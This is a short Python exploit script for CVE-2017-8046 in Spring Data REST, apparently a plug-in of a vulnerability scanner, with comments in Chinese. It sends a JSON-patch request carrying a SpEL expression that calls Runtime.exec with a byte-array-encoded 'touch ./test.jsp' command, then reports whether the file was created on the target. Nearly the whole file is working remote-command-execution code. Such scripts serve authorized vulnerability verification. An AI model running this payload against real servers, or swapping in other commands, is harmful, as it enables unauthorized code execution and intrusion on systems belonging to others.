#!/usr/bin/env python3

'''
name: CVE-2017-8046漏洞
description: CVE-2017-8046漏洞可执行任意命令,执行的命令：/usr/bin/touch ./test.jsp,利用小葵转ascii转换为47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,46,47,116,101,115,116,46,106,115,112
'''

import json
from app.lib.utils.request import request

class CVE_2017_8046_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers1 = {
            "Content-Type": "application/json",
            "Cache-Control": "no-cache"
        }
        self.headers2 = {
            "Content-Type": "application/json-patch+json",
            "Cache-Control": "no-cache"
        }
        self.data1 = {
            "firstName": "VulApps", 
            "lastName": "VulApps"
        }
        self.data2 = [{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,46,47,116,101,115,116,46,106,115,112}))/lastName", "value": "vulapps-demo" }]

    def run(self):
        try:
            if not self.url.startswith("http") and not self.url.startswith("https"):
                self.url = "http://" + self.url
            response1 = request.post(self.url + '/customers', headers = self.headers1, data = json.dumps(self.data1))
            response2 = request.patch(self.url + '/customers/1', headers = self.headers2, data = json.dumps(self.data2))
            content2 = response2.text
            if 'maybe not public' in content2:
                print("存在CVE-2017-8046漏洞,已在目标服务器的根目录下生成了test.jsp文件！")
                return True
            else:
                print("不存在存在CVE-2017-8046漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == '__main__':
    CVE_2017_8046 = CVE_2017_8046_BaseVerify('http://192.168.30.242:8086')
    CVE_2017_8046.run()